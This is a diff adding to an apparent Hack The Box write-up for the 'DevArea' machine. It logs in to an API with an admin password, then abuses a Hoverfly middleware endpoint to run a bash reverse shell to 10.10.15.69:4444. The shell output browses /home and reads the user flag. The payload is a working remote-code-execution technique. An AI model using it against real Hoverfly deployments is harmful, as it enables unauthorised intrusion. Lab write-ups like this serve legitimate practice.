@@ -199,3 +199,33 @@ ajdev@rootbox:~/HTB/DevArea$ curl -s -X POST http://devarea.htb:8888/api/token-a
 -d '{"username":"admin","password":"O7IJ27MyyXiU"}'
 {"token":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODU5Nzg4MjMsImlhdCI6MTc3NDkzODgyMywic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.mMwrb0M7U2vM0yfGizMPyLvOPw3SdV4--uDcKfXI4u9h77ZColt_1iV2LdEPEi5LefMOUkn6Jo-UpatQeyCsQQ"}
 ```
+
+now get reverse shell:
+
+```
+ajdev@rootbox:~/HTB/DevArea$ curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
+-H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODU5Nzg4MjMsImlhdCI6MTc3NDkzODgyMywic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.mMwrb0M7U2vM0yfGizMPyLvOPw3SdV4--uDcKfXI4u9h77ZColt_1iV2LdEPEi5LefMOUkn6Jo-UpatQeyCsQQ" \
+-H "Content-Type: application/json" \
+-d '{"binary":"bash","script":"bash -i >& /dev/tcp/10.10.15.69/4444 0>&1"}'
+
+listen i
+
+dev_ryan@devarea:/opt/HoverFly$ cd /home
+cd /home
+dev_ryan@devarea:/home$ ls -la
+ls -la
+total 12
+drwxr-xr-x  3 root     root     4096 Dec  4 14:05 .
+drwxr-xr-x 24 root     root     4096 Mar 22 18:55 ..
+drwxr-x---  5 dev_ryan dev_ryan 4096 Mar 10 16:28 dev_ryan
+dev_ryan@devarea:/home$ cd dev_ryan
+cd dev_ryan
+dev_ryan@devarea:~$ ls
+ls
+syswatch-v1.zip
+user.txt
+dev_ryan@devarea:~$ cat user.txt
+cat user.txt
+b26907b13d0b9feb29192f3178938a05
+dev_ryan@devarea:~$
+```
